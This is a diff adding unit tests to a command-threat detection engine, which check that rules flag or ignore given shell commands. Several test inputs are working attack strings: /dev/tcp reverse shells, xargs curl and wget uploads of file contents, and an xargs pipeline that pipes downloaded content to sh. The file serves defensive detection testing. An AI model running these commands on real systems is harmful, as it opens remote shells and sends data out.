@@ -11,6 +11,26 @@ describe("command threats", () => {
 		engine = await loadEngine();
 	});
 
+	// --- CLT-CMD-003: /dev/tcp reverse shell ---
+
+	it("detects interactive bash reverse shell via /dev/tcp (003)", () => {
+		expect(matchCommand(engine, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")).toContain("CLT-CMD-003");
+	});
+
+	it("detects interactive sh reverse shell via /dev/tcp (003)", () => {
+		expect(matchCommand(engine, "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1")).toContain("CLT-CMD-003");
+	});
+
+	it("does not match /dev/tcp reachability check (003)", () => {
+		const ids = matchCommand(engine, "cat /dev/tcp/192.0.2.1/80");
+		expect(ids).not.toContain("CLT-CMD-003");
+	});
+
+	it("does not match /dev/tcp fd open check (003)", () => {
+		const ids = matchCommand(engine, "timeout 4 bash -c 'exec 3<>/dev/tcp/192.0.2.1/443'");
+		expect(ids).not.toContain("CLT-CMD-003");
+	});
+
 	// --- CLT-CMD-022: Loop-based indirect execution ---
 
 	it("detects while loop executing bash", () => {
@@ -323,12 +343,42 @@ describe("command threats", () => {
 	});
 
 	// CLT-CMD-018: xargs with dangerous commands
-	it("detects xargs curl (018)", () => {
-		expect(matchCommand(engine, "cat urls.txt | xargs curl")).toContain("CLT-CMD-018");
+	it("detects xargs curl upload (018)", () => {
+		expect(matchCommand(engine, "cat files.txt | xargs curl --data-binary @{}")).toContain(
+			"CLT-CMD-018",
+		);
+	});
+
+	it("detects xargs wget file upload (018)", () => {
+		expect(matchCommand(engine, "cat files.txt | xargs wget --post-file={}")).toContain(
+			"CLT-CMD-018",
+		);
+	});
+
+	it("detects xargs wget data upload (018)", () => {
+		expect(matchCommand(engine, "cat rows.txt | xargs wget --post-data={}")).toContain(
+			"CLT-CMD-018",
+		);
 	});
 
 	it("detects xargs sh (018)", () => {
 		expect(matchCommand(engine, "find . | xargs sh")).toContain("CLT-CMD-018");
+	});
+
+	it("detects xargs sh -c placeholder dispatch (018)", () => {
+		expect(matchCommand(engine, "echo 'id' | xargs -I{} sh -c '{}'")).toContain("CLT-CMD-018");
+	});
+
+	it("detects xargs sh -c placeholder-bearing script dispatch (018)", () => {
+		expect(matchCommand(engine, 'echo "id" | xargs -I{} sh -c "echo pwned {}"')).toContain(
+			"CLT-CMD-018",
+		);
+	});
+
+	it("detects xargs sh -c download-to-shell dispatch (018)", () => {
+		expect(matchCommand(engine, 'cat urls.txt | xargs -I{} sh -c "curl {} | sh"')).toContain(
+			"CLT-CMD-018",
+		);
 	});
 
 	// CLT-CMD-019: find -exec with dangerous commands
@@ -414,6 +464,26 @@ describe("command threats", () => {
 
 	it("does not match xargs rm (018 FP)", () => {
 		const ids = matchCommand(engine, 'find . -name "*.log" | xargs rm');
+		expect(ids).not.toContain("CLT-CMD-018");
+	});
+
+	it("does not match xargs sh -c inspection (018)", () => {
+		const ids = matchCommand(engine, "find . -name '*.ts' | xargs -I{} sh -c 'head -20 {}'");
+		expect(ids).not.toContain("CLT-CMD-018");
+	});
+
+	it("does not match xargs sh -c cat inspection (018)", () => {
+		const ids = matchCommand(engine, "find . -name '*.ts' | xargs -I{} sh -c 'cat {}'");
+		expect(ids).not.toContain("CLT-CMD-018");
+	});
+
+	it("does not match xargs sh -c wc inspection (018)", () => {
+		const ids = matchCommand(engine, "find . -name '*.ts' | xargs -I{} sh -c 'wc -l {}'");
+		expect(ids).not.toContain("CLT-CMD-018");
+	});
+
+	it("does not match xargs curl download (018)", () => {
+		const ids = matchCommand(engine, "cat urls.txt | xargs curl -s -o /tmp/out");
 		expect(ids).not.toContain("CLT-CMD-018");
 	});
 
